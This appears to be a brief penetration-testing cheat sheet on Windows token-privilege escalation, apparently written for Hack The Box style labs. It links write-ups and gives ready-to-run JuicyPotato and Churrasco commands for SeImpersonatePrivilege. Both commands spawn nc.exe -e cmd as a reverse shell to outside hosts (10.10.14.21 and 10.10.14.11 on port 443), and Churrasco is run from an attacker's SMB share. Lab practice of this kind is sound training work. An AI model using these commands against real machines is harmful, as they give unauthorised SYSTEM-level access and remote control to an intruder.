____

```cmd
whoami /priv
```

`SeLoadDriverPrivilege` https://0xdf.gitlab.io/2020/10/31/htb-fuse.html#priv-svc-print--system
`SeBackupPrivilege` https://0xdf.gitlab.io/2020/10/03/htb-blackfield.html#shell-as-svc_backup
`SeMachineAccountPrivilege` allows me to add a machine to the domain, and I could likely escalate there as well.


# SeImpersonatePrivilege


https://github.com/ohpe/juicy-potato


```cmd
.\JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -l 1337 -a "/c C:\Windows\Temp\nc.exe -e cmd 10.10.14.21 443"
```


## change CLSID


```cmd
systeminfo
```

https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md

## older versions

https://github.com/Re4son/Churrasco/

```bash
\\10.10.14.11\smbFolder\churrasco.exe "\\10.10.14.11\smbFolder\nc.exe -e cmd 10.10.14.11 443"
```
